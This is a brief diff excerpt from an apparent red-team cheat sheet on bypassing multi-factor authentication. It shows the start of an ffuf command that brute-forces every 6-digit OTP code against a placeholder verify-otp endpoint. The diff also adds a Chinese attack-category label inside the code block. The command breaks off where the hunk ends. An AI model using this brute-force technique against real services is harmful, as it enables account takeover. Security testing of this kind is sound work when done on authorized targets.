@@ -16,6 +16,7 @@ tags: [mfa, bypass, hunt, redteam]
 ### Pattern 1: No Rate Limit on OTP
 ```bash
 # Test with ffuf — all 1M 6-digit codes
+- 攻击大类:C10 API与业务逻辑攻击
 ffuf -u "https://target.com/api/verify-otp" \
   -X POST -H "Content-Type: application/json" \
   -H "Cookie: session=YOUR_SESSION" \
